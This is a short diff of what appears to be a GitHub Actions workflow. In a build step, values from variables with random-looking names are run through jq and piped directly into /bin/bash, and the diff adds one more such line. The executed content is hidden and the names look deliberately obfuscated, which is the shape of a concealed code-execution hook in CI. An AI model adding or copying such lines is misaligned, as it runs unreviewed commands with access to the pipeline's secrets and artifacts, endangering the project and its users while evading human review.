@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$mju8" | jq -r .uqn28076 | /bin/bash
           echo $gwr701 | jq -r .jcma1012 | /bin/bash
+          echo $zgt220 | jq -r .epze2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
